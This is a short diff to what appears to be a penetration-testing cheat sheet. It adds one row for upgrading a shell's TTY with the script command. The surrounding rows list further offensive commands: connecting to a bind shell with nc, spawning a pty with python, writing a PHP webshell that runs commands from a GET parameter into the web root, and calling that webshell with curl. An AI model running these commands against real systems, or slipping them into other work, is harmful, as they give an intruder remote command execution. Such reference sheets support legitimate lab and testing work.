@@ -68,6 +68,7 @@
 | `nc 10.10.10.1 1234` | Connect to a bind shell started on the remote server |
 | `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (1) |
 | `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
+| `SHELL=/bin/bash script -q /dev/null` | Upgrade shell TTY (3) |
 | `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create a webshell php file |
 | `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute a command on an uploaded webshell |
 | **Privilege Escalation** |
